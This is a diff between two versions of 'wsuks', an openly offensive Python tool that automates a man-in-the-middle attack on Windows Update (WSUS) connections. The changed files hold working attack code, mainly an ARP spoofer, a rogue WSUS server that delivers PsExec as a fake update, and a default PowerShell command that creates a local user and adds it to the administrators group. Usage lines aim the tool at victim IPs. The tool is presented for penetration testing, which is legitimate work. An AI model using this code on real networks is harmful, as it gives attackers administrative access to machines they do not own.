# Comparing `tmp/wsuks-0.4.1.tar.gz` & `tmp/wsuks-0.4.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "wsuks-0.4.1.tar", max compression
+gzip compressed data, was "wsuks-0.4.2.tar", max compression
```

## Comparing `wsuks-0.4.1.tar` & `wsuks-0.4.2.tar`

### file list

```diff
@@ -1,23 +1,24 @@
--rw-r--r--   0        0        0     1301 2023-04-06 19:28:11.193610 wsuks-0.4.1/LICENSE
--rw-r--r--   0        0        0     2999 2023-07-08 18:26:45.324871 wsuks-0.4.1/README.md
--rw-r--r--   0        0        0      523 2023-07-09 12:00:38.052087 wsuks-0.4.1/pyproject.toml
--rw-r--r--   0        0        0        0 2023-07-01 15:16:02.001468 wsuks-0.4.1/wsuks/__init__.py
--rw-r--r--   0        0        0   717232 2023-03-30 14:57:14.000000 wsuks-0.4.1/wsuks/executables/PsExec.exe
--rw-r--r--   0        0        0   831888 2023-03-30 14:57:14.000000 wsuks-0.4.1/wsuks/executables/PsExec64.exe
--rw-r--r--   0        0        0        0 2023-03-19 17:44:56.143981 wsuks-0.4.1/wsuks/helpers/__init__.py
--rw-r--r--   0        0        0     3107 2023-07-08 18:15:56.196858 wsuks-0.4.1/wsuks/helpers/argparser.py
--rw-r--r--   0        0        0     3306 2023-07-07 23:08:04.680283 wsuks-0.4.1/wsuks/helpers/arpspoofer.py
--rw-r--r--   0        0        0     2628 2023-07-07 23:26:14.448306 wsuks-0.4.1/wsuks/helpers/logger.py
--rw-r--r--   0        0        0     3383 2023-07-08 17:51:21.092827 wsuks-0.4.1/wsuks/helpers/sysvolparser.py
--rw-r--r--   0        0        0    10323 2023-07-07 23:20:30.360298 wsuks-0.4.1/wsuks/helpers/wsusserver.py
--rw-r--r--   0        0        0     4535 2023-07-09 11:57:58.844084 wsuks-0.4.1/wsuks/wsuks.py
--rw-r--r--   0        0        0      583 2023-04-06 19:28:41.085610 wsuks-0.4.1/wsuks/xml_files/get-authorization-cookie.xml
--rw-r--r--   0        0        0      838 2023-04-06 19:28:44.697610 wsuks-0.4.1/wsuks/xml_files/get-config.xml
--rw-r--r--   0        0        0      526 2023-04-06 19:28:47.697610 wsuks-0.4.1/wsuks/xml_files/get-cookie.xml
--rw-r--r--   0        0        0     4247 2023-04-06 19:28:51.417611 wsuks-0.4.1/wsuks/xml_files/get-extended-update-info.xml
--rw-r--r--   0        0        0      469 2023-04-06 19:28:58.353611 wsuks-0.4.1/wsuks/xml_files/internal-error.xml
--rw-r--r--   0        0        0      364 2023-04-06 19:29:04.397611 wsuks-0.4.1/wsuks/xml_files/register-computer.xml
--rw-r--r--   0        0        0      418 2023-04-06 19:29:08.141611 wsuks-0.4.1/wsuks/xml_files/report-event-batch.xml
--rw-r--r--   0        0        0     3295 2023-04-06 19:29:12.273611 wsuks-0.4.1/wsuks/xml_files/sync-updates.xml
--rw-r--r--   0        0        0     3966 1970-01-01 00:00:00.000000 wsuks-0.4.1/setup.py
--rw-r--r--   0        0        0     3655 1970-01-01 00:00:00.000000 wsuks-0.4.1/PKG-INFO
+-rw-r--r--   0        0        0     1301 2023-04-06 19:28:11.193610 wsuks-0.4.2/LICENSE
+-rw-r--r--   0        0        0     2690 2023-07-10 20:27:14.458435 wsuks-0.4.2/README.md
+-rw-r--r--   0        0        0      555 2023-07-18 22:22:45.572564 wsuks-0.4.2/pyproject.toml
+-rw-r--r--   0        0        0        0 2023-07-01 15:16:02.001468 wsuks-0.4.2/wsuks/__init__.py
+-rw-r--r--   0        0        0   717232 2023-03-30 14:57:14.000000 wsuks-0.4.2/wsuks/executables/PsExec.exe
+-rw-r--r--   0        0        0   831888 2023-03-30 14:57:14.000000 wsuks-0.4.2/wsuks/executables/PsExec64.exe
+-rw-r--r--   0        0        0        0 2023-03-19 17:44:56.143981 wsuks-0.4.2/wsuks/helpers/__init__.py
+-rw-r--r--   0        0        0     3016 2023-07-10 20:27:14.458435 wsuks-0.4.2/wsuks/helpers/argparser.py
+-rw-r--r--   0        0        0     3280 2023-07-12 16:18:53.589900 wsuks-0.4.2/wsuks/helpers/arpspoofer.py
+-rw-r--r--   0        0        0     2608 2023-07-10 20:27:14.458435 wsuks-0.4.2/wsuks/helpers/logger.py
+-rw-r--r--   0        0        0     2210 2023-07-18 21:30:34.560499 wsuks-0.4.2/wsuks/helpers/router.py
+-rw-r--r--   0        0        0     3385 2023-07-10 20:27:14.458435 wsuks-0.4.2/wsuks/helpers/sysvolparser.py
+-rw-r--r--   0        0        0    10390 2023-07-18 22:00:43.456536 wsuks-0.4.2/wsuks/helpers/wsusserver.py
+-rw-r--r--   0        0        0     5298 2023-07-18 21:59:36.100535 wsuks-0.4.2/wsuks/wsuks.py
+-rw-r--r--   0        0        0      583 2023-04-06 19:28:41.085610 wsuks-0.4.2/wsuks/xml_files/get-authorization-cookie.xml
+-rw-r--r--   0        0        0      838 2023-04-06 19:28:44.697610 wsuks-0.4.2/wsuks/xml_files/get-config.xml
+-rw-r--r--   0        0        0      526 2023-04-06 19:28:47.697610 wsuks-0.4.2/wsuks/xml_files/get-cookie.xml
+-rw-r--r--   0        0        0     4247 2023-04-06 19:28:51.417611 wsuks-0.4.2/wsuks/xml_files/get-extended-update-info.xml
+-rw-r--r--   0        0        0      469 2023-04-06 19:28:58.353611 wsuks-0.4.2/wsuks/xml_files/internal-error.xml
+-rw-r--r--   0        0        0      364 2023-04-06 19:29:04.397611 wsuks-0.4.2/wsuks/xml_files/register-computer.xml
+-rw-r--r--   0        0        0      418 2023-04-06 19:29:08.141611 wsuks-0.4.2/wsuks/xml_files/report-event-batch.xml
+-rw-r--r--   0        0        0     3295 2023-04-06 19:29:12.273611 wsuks-0.4.2/wsuks/xml_files/sync-updates.xml
+-rw-r--r--   0        0        0     3662 1970-01-01 00:00:00.000000 wsuks-0.4.2/setup.py
+-rw-r--r--   0        0        0     3399 1970-01-01 00:00:00.000000 wsuks-0.4.2/PKG-INFO
```

### Comparing `wsuks-0.4.1/LICENSE` & `wsuks-0.4.2/LICENSE`

 * *Files identical despite different names*

### Comparing `wsuks-0.4.1/pyproject.toml` & `wsuks-0.4.2/pyproject.toml`

 * *Files 24% similar despite different names*

```diff
@@ -1,26 +1,29 @@
 [tool.poetry]
 name = "wsuks"
-version = "0.4.1"
+version = "0.4.2"
 description = "A Tool for automating the MITM attack on the WSUS connection"
 authors = ["Alexander Neff <alex99.neff@gmx.de>"]
 readme = "README.md"
 license = "MIT"
 packages = [
     { include = "wsuks" }
 ]
 
 [tool.poetry.scripts]
 wsuks = "wsuks.wsuks:main"
 
 [tool.poetry.dependencies]
-python = "^3.10"
+python = "^3.8.1"
 impacket = "^0.10.0"
 scapy = "^2.5.0"
 termcolor = "^2.2.0"
 bs4 = "^0.0.1"
 lxml = "^4.9.3"
 
 
 [build-system]
 requires = ["poetry-core"]
 build-backend = "poetry.core.masonry.api"
+
+[tool.ruff]
+ignore = ["E501"]
```

### Comparing `wsuks-0.4.1/wsuks/executables/PsExec.exe` & `wsuks-0.4.2/wsuks/executables/PsExec.exe`

 * *Files identical despite different names*

### Comparing `wsuks-0.4.1/wsuks/executables/PsExec64.exe` & `wsuks-0.4.2/wsuks/executables/PsExec64.exe`

 * *Files identical despite different names*

### Comparing `wsuks-0.4.1/wsuks/helpers/argparser.py` & `wsuks-0.4.2/wsuks/helpers/argparser.py`

 * *Files 2% similar despite different names*

```diff
@@ -8,21 +8,21 @@
 from os.path import dirname
 
 __version__ = importlib.metadata.version('wsuks')
 
 
 def printBanner():
     print(f"""
-    __          __ _____  _    _  _  __  _____ 
+    __          __ _____  _    _  _  __  _____
     \ \        / // ____|| |  | || |/ / / ____|
-     \ \  /\  / /| (___  | |  | || ' / | (___  
+     \ \  /\  / /| (___  | |  | || ' / | (___
       \ \/  \/ /  \___ \ | |  | ||  <   \___ \ 
        \  /\  /   ____) || |__| || . \  ____) |
-        \/  \/   |_____/  \____/ |_|\_\|_____/ 
-                                                                                        
+        \/  \/   |_____/  \____/ |_|\_\|_____/
+
      Pentesting Tool for the WSUS MITM Attack
                Made by NeffIsBack
                  Version: {__version__}
 """)
 
 
 def initParser():
@@ -34,15 +34,15 @@
     parser = argparse.ArgumentParser(prog='wsuks', epilog=example_text, formatter_class=RawTextHelpFormatter)
 
     parser.add_argument('-v', '--version', action='version', version='Current Version: %(prog)s 2.0')
     parser.add_argument('--debug', action='store_true', help='Enable debug output')
 
     parser.add_argument('-t', '--target-ip', metavar='', dest='targetIp', help='IP Address of the victim Client. (REQUIRED)', required=True)
     parser.add_argument('-I', '--interface', metavar='', help='Network Interface to use. (DEFAULT: %(default)s)', default='eth0')
-    parser.add_argument('-e', '--executable', metavar='', default=f'{dirname(wsuks.__file__)}/executables/PsExec64.exe',type=argparse.FileType('rb'), help='The executable to returned to the victim. It has to be signed by Microsoft (DEFAULT: %(default)s)')
+    parser.add_argument('-e', '--executable', metavar='', default=f'{dirname(wsuks.__file__)}/executables/PsExec64.exe', type=argparse.FileType('rb'), help='The executable to returned to the victim. It has to be signed by Microsoft (DEFAULT: %(default)s)')
     parser.add_argument('-c', '--command', metavar='', help='The command to execute on the victim. (DEFAULT: %(default)s)', default='/accepteula /s powershell.exe \'PREFIXAdd-LocalGroupMember -Group $(Get-LocalGroup -SID S-1-5-32-544 | Select Name) -Member "WSUKS_USER"\'')
 
     simple = parser.add_argument_group('AUTOMATIC MODE', 'Discover the WSUS Server automatically by searching for GPOs in SYSVOL. (Default)')
     simple.add_argument('-u', '--username', metavar='', help='Username to authenticate with')
     simple.add_argument('-p', '--password', metavar='', help='Password to authenticate with')
     simple.add_argument('-dc-ip', metavar='', dest='dcIp', help='IP Address of the domain controller')
     simple.add_argument('-d', '--domain', metavar='', help='Domain to authenticate with')
```

### Comparing `wsuks-0.4.1/wsuks/helpers/arpspoofer.py` & `wsuks-0.4.2/wsuks/helpers/arpspoofer.py`

 * *Files 12% similar despite different names*

```diff
@@ -14,50 +14,50 @@
     This class is used to enable MITM attacks with ARP spoofing.
     """
 
     def __init__(self):
         self.logger = logging.getLogger("wsuks")
         self.isRunning = False
         self.targetIp = None
+        self.targetMac = None
         self.spoofIp = None
 
     def _spoof(self, targetIp, spoofIp):
         """
         Spoof the target's ARP table by sending a fake ARP response with our MAC address as the sender.
-        
+
         :param targetIp: The victim's IP address
         :param spoofIp: The IP address to spoof
         """
-        targetMac = scapy.getmacbyip(targetIp)
+        self.targetMac = scapy.getmacbyip(targetIp)
         self.logger.debug(f"Target IP address: {targetIp}")
-        self.logger.debug(f"Target MAC address: {targetMac}")
-        if targetMac == None:
+        self.logger.debug(f"Target MAC address: {self.targetMac}")
+        if self.targetMac is None:
             self.logger.error(f"ARP request for IP address {targetIp} failed! Target is not reachable!")
             sys.exit(1)
         else:
             while self.isRunning:
                 self.logger.debug(f"Tell target {targetIp} that spoofed IP address {spoofIp} is at our MAC address")
-                packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=(spoofIp))
+                packet = scapy.ARP(op=2, pdst=targetIp, hwdst=self.targetMac, psrc=(spoofIp))
                 scapy.send(packet, verbose=False)
                 time.sleep(1)
 
     def _restore(self, targetIp, source_ip):
         """
         Restore the target's ARP table by sending a real ARP response.
         This is done by sending the target the spoofed IP address and the real MAC address of the spoofed IP address.
 
         :param targetIp: The victim's IP address
         :param source_ip: The spoofed IP address
         """
         try:
             self.logger.info(f"Restoring ARP tables for target {targetIp} and spoofed IP address {source_ip}")
             self.logger.debug(f"Tell target {targetIp} the correct MAC-Adress for spoofed IP address {source_ip}")
-            destination_mac = scapy.getmacbyip(targetIp)
             source_mac = scapy.getmacbyip(source_ip)
-            packet = scapy.ARP(op=2, pdst=targetIp, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+            packet = scapy.ARP(op=2, pdst=targetIp, hwdst=self.targetMac, psrc=source_ip, hwsrc=source_mac)
             scapy.send(packet, verbose=False)
         except Exception as e:
             self.logger.error(f"Error while restoring ARP tables: {e}")
             if self.logger.level == logging.DEBUG:
                 traceback.print_exc()
 
     def start(self, targetIp, spoofIp):
@@ -70,20 +70,18 @@
         self.targetIp = targetIp
         self.spoofIp = spoofIp
         self.isRunning = True
 
         self.logger.info(f"Starting ARP spoofing for target {targetIp} and spoofing IP address {spoofIp}")
         t1 = Thread(target=self._spoof, args=(targetIp, spoofIp))
         t1.start()
-        
+
     def stop(self):
         """
         Stop the ARP spoofing process.
         """
         if self.isRunning and self.targetIp and self.spoofIp:
             self.logger.info(f"Stopping ARP spoofing for target {self.targetIp}")
             self.isRunning = False
             self._restore(self.targetIp, self.spoofIp)
         else:
             self.logger.error("ARP spoofing is not running")
-
-
```

### Comparing `wsuks-0.4.1/wsuks/helpers/logger.py` & `wsuks-0.4.2/wsuks/helpers/logger.py`

 * *Files 1% similar despite different names*

```diff
@@ -37,23 +37,23 @@
     """
 
     def __init__(self):
         logging.Formatter.__init__(self, '[%(asctime)-15s] %(bullet)s %(message)s', None)
 
     def formatTime(self, record):
         return WsuksFormatter.formatTime(self, record, datefmt="%Y-%m-%d %H:%M:%S")
-    
+
+
 def addSuccessLogLevel(logger):
     logging.SUCCESS = 25  # between WARNING and INFO
     logging.addLevelName(logging.SUCCESS, 'SUCCESS')
-    
+
     def success(self, msg, *args, **kwargs):
         logger._log(25, msg, args, **kwargs)
     setattr(logging.getLoggerClass(), 'success', success)
-    
 
 
 def initLogger(ts=False, debug=False):
     """
     Initialize wsuks logger with specified logging level, add formatter, handler and success log level
 
     :param ts: Add timestamp to log messages
@@ -61,15 +61,15 @@
     :return: logger
     """
     handler = logging.StreamHandler(sys.stdout)
     if ts:
         handler.setFormatter(WsuksFormatterTimeStamp())
     else:
         handler.setFormatter(WsuksFormatter())
-    
+
     logger = logging.getLogger("wsuks")
     logger.propagate = False
     root_logger = logging.getLogger()
 
     logger.addHandler(handler)
     root_logger.addHandler(handler)
 
@@ -78,9 +78,9 @@
         root_logger.setLevel(logging.DEBUG)
     else:
         logger.setLevel(logging.INFO)
         root_logger.setLevel(logging.INFO)
 
     addSuccessLogLevel(logger)
     addSuccessLogLevel(root_logger)
-    
+
     return logger
```

### Comparing `wsuks-0.4.1/wsuks/helpers/sysvolparser.py` & `wsuks-0.4.2/wsuks/helpers/sysvolparser.py`

 * *Files 1% similar despite different names*

```diff
@@ -16,16 +16,16 @@
         self.wsusPort = None  # Default 8530
 
     def _createSMBConnection(self, domain, username, password, dcIp, kerberos=False, lmhash='', nthash='', aesKey=''):
         """
         Create a SMB connection to the target
         """
         # SMB Login would be ready for kerberos or NTLM Hashes Authentication if it is needed
-        #TODO: Fix remoteName in SMBConnection if this is a bug
-        #TODO: Add Kerberos Authentication
+        # TODO: Fix remoteName in SMBConnection if this is a bug
+        # TODO: Add Kerberos Authentication
         try:
             self.smbClient = SMBConnection(remoteName=dcIp, remoteHost=dcIp, sess_port=int(445))
 
             if kerberos is True:
                 self.smbClient.kerberosLogin(username, password, domain, lmhash, nthash, aesKey, dcIp)
             else:
                 self.smbClient.login(username, password, domain, lmhash, nthash)
```

### Comparing `wsuks-0.4.1/wsuks/helpers/wsusserver.py` & `wsuks-0.4.2/wsuks/helpers/wsusserver.py`

 * *Files 2% similar despite different names*

```diff
@@ -123,17 +123,18 @@
             sys.exit(1)
 
     def __str__(self):
         return f'The update metadata - uuids: {self.uuids}, revision_ids: {self.revision_ids}, deployment_ids: {self.deployment_ids}, executable: {self.executable_name}, sha1: {self.sha1}, sha256: {self.sha256}, command: {self.command}'
 
 
 class WSUSBaseServer(BaseHTTPRequestHandler):
-    def __init__(self, wsusUpdateHandler):
+    def __init__(self, wsusUpdateHandler, *args, **kwargs):
         self.logger = logging.getLogger("wsuks")
         self.wsusUpdateHandler = wsusUpdateHandler
+        super().__init__(*args, **kwargs)
 
     def _set_response(self, serveEXE=False):
 
         self.protocol_version = 'HTTP/1.1'
         self.send_response(200)
         # self.server_version = 'Microsoft-IIS/10.0'
         # self.send_header('Accept-Ranges', 'bytes')
@@ -146,23 +147,23 @@
             self.send_header('Content-type', 'text/xml; chartset=utf-8')
 
         self.send_header('X-AspNet-Version', '4.0.30319')
         self.send_header('X-Powered-By', 'ASP.NET')
         self.end_headers()
 
     def do_HEAD(self):
-        self.logger.debug(f'HEAD request,\nPath: {self.path}\nHeaders:\n{self.headers}\n')
+        self.logger.success(f'HEAD request,\nPath: {self.path}\nHeaders:\n{self.headers}\n')
 
         if self.path.find(".exe"):
             self.logger.info(f"Requested: {self.path}")
 
             self._set_response(True)
 
     def do_GET(self):
-        self.logger.debug(f'GET request,\nPath: {self.path}\nHeaders:\n{self.headers}\n')
+        self.logger.success(f'GET request,\nPath: {self.path}\nHeaders:\n{self.headers}\n')
 
         if self.path.find(".exe"):
             self.logger.info(f"Requested: {self.path}")
 
             self._set_response(True)
             self.wfile.write(self.wsusUpdateHandler.executable)
 
@@ -170,15 +171,15 @@
 
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
 
         post_data_xml = BeautifulSoup(post_data, "xml")
         data = None
 
-        self.logger.debug(f"POST Request,\nPath: {self.path}\nHeaders:\n{self.headers}\n\nBody:\n{post_data_xml.encode_contents()}\n")
+        self.logger.success(f"POST Request,\nPath: {self.path}\nHeaders:\n{self.headers}\n\nBody:\n{post_data_xml.encode_contents()}\n")
 
         soap_action = self.headers['SOAPAction']
 
         if soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"':
             # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/b76899b4-ad55-427d-a748-2ecf0829412b
             data = BeautifulSoup(self.wsusUpdateHandler.get_config_xml, 'xml')
 
@@ -216,10 +217,10 @@
 
         self._set_response()
         self.wfile.write(data.encode_contents())
 
         self.logger.info(f'SOAP Action: {soap_action}')
 
         if data is not None:
-            self.logger.debug(f"POST Response,\nPath: {self.path}\nHeaders:\n{self.headers}\n\nBody:\n{data.encode_contents}\n")
+            self.logger.success(f"POST Response,\nPath: {self.path}\nHeaders:\n{self.headers}\n\nBody:\n{data.encode_contents}\n")
         else:
             self.logger.warning("POST Response without data.")
```

### Comparing `wsuks-0.4.1/wsuks/wsuks.py` & `wsuks-0.4.2/wsuks/wsuks.py`

 * *Files 25% similar despite different names*

```diff
@@ -1,40 +1,46 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+from functools import partial
 from http.server import HTTPServer
 import logging
 import os
 from pprint import pformat
 import random
 from string import digits, ascii_letters
-from scapy.all import get_if_addr, sniff
+from threading import Thread
+from scapy.all import get_if_addr, sniff, conf, IP, TCP, send
 from wsuks.helpers.arpspoofer import ArpSpoofer
 from wsuks.helpers.logger import initLogger
 from wsuks.helpers.argparser import initParser, printBanner
 from wsuks.helpers.sysvolparser import SysvolParser
 from wsuks.helpers.wsusserver import WSUSUpdateHandler, WSUSBaseServer
+from wsuks.helpers.router import Router
 from termcolor import colored
 
 
 class Wsuks:
     def __init__(self, args):
+        self.args = args
+
         self.logger = logging.getLogger("wsuks")
-        self.hostIp = get_if_addr(args.interface)
+        self.interface = args.interface
+        self.hostIp = get_if_addr(self.interface)
         self.local_username = "user" + "".join(random.choice(digits) for i in range(5))
         self.local_password = "".join(random.sample(ascii_letters, 16))
 
         # Set args
         self.targetIp = args.targetIp  # Never None (required)
         self.executable_file = args.executable.read()
         self.executable_name = os.path.basename(args.executable.name)
         args.executable.close()
 
         # Set Command
-        if args.command:
+        if "PREFIX" not in args.command:
             self.command = args.command
         else:
             command_prefix = 'New-LocalUser -Name "WSUKS_USER" -Password $(ConvertTo-SecureString "WSUKS_PASSWORD" -AsPlainText -Force) -Fullname "wsuks user" -Description "This user was generated by the wsuks Tool"; '
             if args.username and args.password and args.domain:
                 self.logger.success(f"Using domain user for the WSUS attack: User={colored(args.username, 'green', attrs=['bold'])} Password={colored(args.password, 'green', attrs=['bold'])} Domain={colored(args.domain, 'green', attrs=['bold'])}")
                 self.command = args.command.replace("PREFIX", "").replace("WSUKS_USER", args.domain + "\\" + args.username).replace("WSUKS_PASSWORD", args.password)
             else:
@@ -54,39 +60,53 @@
         sysvolparser = SysvolParser()
         if not self.wsusIp:
             self.logger.info("WSUS Server not specified, trying to find it in SYSVOL share on DC")
             self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.domain_username, self.domain_password, self.dcIp)
         else:
             self.logger.info(f"WSUS Server specified manually: {self.wsusIp}:{self.wsusPort}")
 
+        #print(conf.route)
+        #conf.route.add(host=self.wsusIp, gw=self.hostIp)
+        #print(conf.route)
+
         # Start Arp Spoofing
         arpspoofer = ArpSpoofer()
         arpspoofer.start(self.targetIp, self.wsusIp)
 
         # Prepare WSUS Update Handler
-        # sniff(filter="tcp and port 8530", prn=self.handlePacket, store=0)
+        router = Router()
+        # router.start(self.targetIp, self.hostIp, self.wsusIp, self.interface)
+
+        #t1 = Thread(target=self.run_sniff, args=(self))
+        #t1.start()
+        #sniff(filter=f"tcp", prn=self.handlePacket, store=0, iface=self.args.interface)
+        #print("TEST")
+
         update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}')
         update_handler.set_resources_xml(self.command)
 
         self.logger.debug(update_handler)
 
         # Prepare WSUS HTTP Server
-        wsusBaseServer = WSUSBaseServer(update_handler)
-        http_server = HTTPServer((self.hostIp, self.wsusPort), wsusBaseServer)
+        http_handler = partial(WSUSBaseServer, update_handler)
+        http_server = HTTPServer((self.hostIp, self.wsusPort), http_handler)
         try:
             self.logger.info(f"Starting WSUS Server on {self.hostIp}:{self.wsusPort}...")
             http_server.serve_forever()
         except KeyboardInterrupt:
             print("")
             self.logger.info("Stopping WSUS Server...")
         finally:
+            router.stop()
             arpspoofer.stop()
 
     def handlePacket(self, packet):
-        packet.show()
+        #and (packet[IP].src == self.targetIp or packet[IP].src == self.hostIp or packet[IP].src == self.wsusIp)
+        if IP in packet and TCP in packet and packet[IP].src == self.targetIp:
+            packet.show()
 
 
 def main():
     # Setup
     printBanner()
     args = initParser()
```

### Comparing `wsuks-0.4.1/wsuks/xml_files/get-authorization-cookie.xml` & `wsuks-0.4.2/wsuks/xml_files/get-authorization-cookie.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.4.1/wsuks/xml_files/get-config.xml` & `wsuks-0.4.2/wsuks/xml_files/get-config.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.4.1/wsuks/xml_files/get-cookie.xml` & `wsuks-0.4.2/wsuks/xml_files/get-cookie.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.4.1/wsuks/xml_files/get-extended-update-info.xml` & `wsuks-0.4.2/wsuks/xml_files/get-extended-update-info.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.4.1/wsuks/xml_files/sync-updates.xml` & `wsuks-0.4.2/wsuks/xml_files/sync-updates.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.4.1/setup.py` & `wsuks-0.4.2/setup.py`

 * *Files 18% similar despite different names*

```diff
@@ -15,24 +15,24 @@
  'termcolor>=2.2.0,<3.0.0']
 
 entry_points = \
 {'console_scripts': ['wsuks = wsuks.wsuks:main']}
 
 setup_kwargs = {
     'name': 'wsuks',
-    'version': '0.4.1',
+    'version': '0.4.2',
     'description': 'A Tool for automating the MITM attack on the WSUS connection',
-    'long_description': '![Supported Python versions](https://img.shields.io/badge/python-3.10+-blue.svg) [![Twitter](https://img.shields.io/twitter/follow/al3x_n3ff?label=al3x_n3ff&style=social)](https://twitter.com/intent/follow?screen_name=al3x_n3ff)\n# wsuks\n_Weaponizing the WSUS Attack_\n\nGaining local administrative access on a Windows machine that is part of a domain is typically the initial step towards acquiring domain admin privileges during a penetration test. In order to exploit the WSUS attack automatically, this tool spoofs the IP address of the WSUS server within the network using ARP, and when the client requests Windows updates, it provides its own malicious updates instead.\nBy default, a Windows client requests updates every 24 hours. \n\nBoth the executable file served (Default: PsExec64.exe) and the executed command can be changed as needed.\n\nPrerequisits:\n- The target Client must be on the local network\n- The Windows Server Update Service (WSUS) must be configured using HTTP\n\nResult:\n- After successful execution the user provided will be added to the local admin group. If no user was specified a user with the format user[0-9]{5} (e.g. user12345) and a random password will be created\n\n## Installation\nUsing pipx:\n```\nsudo apt install python3-pipx\npipx ensurepath\npipx install wsuks\nsudo ln -s ~/.local/pipx/venvs/wsuks/bin/wsuks /usr/local/bin/wsuks\n```\n\nUsing poetry:\n```\nsudo apt install python3-poetry\ngit clone https://github.com/NeffIsBack/wsuks\ncd wsuks\nsudo poetry install\n```\n\n## Usage\n❗wsuks must be run as root❗\n\nWith pipx:\n```\nsudo wsuks\nsuso wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20     # This will generate a new local user and add it to the local admin group\nsudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -p Password -d Domain.local     # This will add the provided user to the local admin group\nsudo wsuks -t 10.0.0.10 -u User -p Password -d Domain.local --dc-ip 10.0.0.1      # This will start the auto discovery mode and add the provided user to the local admin group\n```\n\nWith poetry:\n```\nsuso poetry run wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20     # This will generate a new local user and add it to the local admin group\nsudo poetry run wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -p Password -d Domain.local     # This will add the provided user to the local admin group\nsudo poetry run wsuks -t 10.0.0.10 -u User -p Password -d Domain.local --dc-ip 10.0.0.1      # This will start the auto discovery mode and add the provided user to the local admin group\n```\n\n## About & Mitigation\nIn the [PyWSUS](https://github.com/GoSecure/pywsus) Repository from GoSecure you can find a great documentation how to you could detect and mitigate this attack.\nThey also wrote a great Guide demonstrating how this attack works in detail [here](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/).\n\nThis Tool is based on the following projects:\n- https://github.com/GoSecure/pywsus\n- https://github.com/GoSecure/wsuspect-proxy\n\n',
+    'long_description': '![Supported Python versions](https://img.shields.io/badge/python-3.8.1+-blue.svg) [![Twitter](https://img.shields.io/twitter/follow/al3x_n3ff?label=al3x_n3ff&style=social)](https://twitter.com/intent/follow?screen_name=al3x_n3ff)\n# wsuks\n_Weaponizing the WSUS Attack_\n\nGaining local administrative access on a Windows machine that is part of a domain is typically the initial step towards acquiring domain admin privileges during a penetration test. In order to exploit the WSUS attack automatically, this tool spoofs the IP address of the WSUS server within the network using ARP, and when the client requests Windows updates, it provides its own malicious updates instead.\nBy default, a Windows client requests updates every 24 hours. \n\nBoth the executable file served (Default: PsExec64.exe) and the executed command can be changed as needed.\n\nPrerequisits:\n- The target Client must be on the local network\n- The Windows Server Update Service (WSUS) must be configured using HTTP\n\nResult:\n- After successful execution the user provided will be added to the local admin group. If no user was specified a user with the format user[0-9]{5} (e.g. user12345) and a random password will be created\n\n## Installation\nUsing pipx (recommended):\n```\nsudo apt install python3-pipx\npipx ensurepath\npipx install wsuks\nsudo ln -s ~/.local/pipx/venvs/wsuks/bin/wsuks /usr/local/bin/wsuks\n```\n\nUsing poetry:\n```\nsudo apt install python3-poetry\ngit clone https://github.com/NeffIsBack/wsuks\ncd wsuks\nsudo poetry install\n```\n\n## Usage\n❗wsuks must be run as root❗\n\nUsing pipx you can simply run `sudo wsuks ...` anywhere on the system.\\\nUsing poetry you must be in the wsuks folder and begin every command with `sudo poetry run wsuks ...`\n\n#### Specify known WSUS-Server and create local admin user:\n```\nsudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20\n```\n#### Specify known WSUS-Server and add provided domain user to local admin group (Domain is required!):\n```\nsudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -p Password -d Domain.local\n```\n#### Autodiscover the WSUS-Server by only specifying the domain user with the dc-ip:\n```\nsudo wsuks -t 10.0.0.10 -u User -p Password -d Domain.local --dc-ip 10.0.0.1\n```\n\n## About & Mitigation\nIn the [PyWSUS](https://github.com/GoSecure/pywsus) Repository from GoSecure you can find a great documentation how to you could detect and mitigate this attack.\nThey also wrote a great Guide demonstrating how this attack works in detail [here](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/).\n\nThis Tool is based on the following projects:\n- https://github.com/GoSecure/pywsus\n- https://github.com/GoSecure/wsuspect-proxy\n\n',
     'author': 'Alexander Neff',
     'author_email': 'alex99.neff@gmx.de',
     'maintainer': 'None',
     'maintainer_email': 'None',
     'url': 'None',
     'packages': packages,
     'package_data': package_data,
     'install_requires': install_requires,
     'entry_points': entry_points,
-    'python_requires': '>=3.10,<4.0',
+    'python_requires': '>=3.8.1,<4.0.0',
 }
 
 
 setup(**setup_kwargs)
```

### Comparing `wsuks-0.4.1/PKG-INFO` & `wsuks-0.4.2/PKG-INFO`

 * *Files 25% similar despite different names*

```diff
@@ -1,27 +1,28 @@
 Metadata-Version: 2.1
 Name: wsuks
-Version: 0.4.1
+Version: 0.4.2
 Summary: A Tool for automating the MITM attack on the WSUS connection
 License: MIT
 Author: Alexander Neff
 Author-email: alex99.neff@gmx.de
-Requires-Python: >=3.10,<4.0
+Requires-Python: >=3.8.1,<4.0.0
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.9
 Classifier: Programming Language :: Python :: 3.10
 Classifier: Programming Language :: Python :: 3.11
 Requires-Dist: bs4 (>=0.0.1,<0.0.2)
 Requires-Dist: impacket (>=0.10.0,<0.11.0)
 Requires-Dist: lxml (>=4.9.3,<5.0.0)
 Requires-Dist: scapy (>=2.5.0,<3.0.0)
 Requires-Dist: termcolor (>=2.2.0,<3.0.0)
 Description-Content-Type: text/markdown
 
